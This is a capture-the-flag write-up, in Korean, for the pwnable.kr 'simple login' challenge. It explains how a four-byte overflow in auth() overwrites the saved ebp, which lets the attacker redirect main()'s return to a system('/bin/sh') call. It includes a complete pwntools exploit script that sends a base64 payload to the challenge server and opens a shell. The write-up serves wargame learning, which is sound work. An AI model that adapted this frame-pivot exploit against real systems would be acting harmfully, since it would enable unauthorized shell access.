# [pwnable.kr] simple login

> Can you get authentication from this server?
>
> Download : http://pwnable.kr/bin/login
>
> Running at : nc pwnable.kr 9003

## Bug

![image](https://github.com/user-attachments/assets/dc4ecb23-f54b-440c-b262-2c9894a211ca)

`auth()`에 들어오는 `input`의 길이는 최대 `0xc`이다. 그런데 이 `input`을 `ebp-0x8`에 위치한 `v4`의 위치에 복사한다.

![image](https://github.com/user-attachments/assets/aa15fd9f-ff8e-4040-9cbe-411c596877e1)

![image](https://github.com/user-attachments/assets/11d7a2aa-83e6-4b58-b24d-21dd8d413eed)

따라서 `ebp`에 저장된 값을 원하는 값으로 덮어쓸 수 있다.

`auth()`의 `ebp`에 저장된 값은 `auth()`가 return된 후에 진행되는 `main()`의 `ebp`가 된다.

![image](https://github.com/user-attachments/assets/25b6081a-1a12-4aa0-9f10-05e4765760e6)

`main()`의 return address는 `ebp+0x4`에 위치하기 때문에, 이를 이용하여 실행 흐름을 조작할 수 있다.

## Exploit

`correct()`에서 `system("/bin/sh")`을 호출하는 코드의 주소를 `input`에 넣고 `main()`의 `ebp`를 `input`의 주소에서 4를 뺀 값으로 조작하면 `main()`은 `correct()`로 return하게 된다.

```python
# ex.py

from pwn import process, remote, p32, pause
from base64 import b64encode

r = remote("pwnable.kr", 9003)

correct = 0x804925F  # correct()
inp = 0x811EB40  # input

payload = p32(correct + 37)  # address of system("/bin/sh")
payload = payload.ljust(8, b"A")
payload += p32(inp - 4)  # fake ebp of main()

payload = b64encode(payload)

r.sendlineafter(b"Authenticate : ", payload)

r.interactive()
```

![image](https://github.com/user-attachments/assets/5b07cfdc-1674-4f64-aa48-2dcb7fd64a5d)
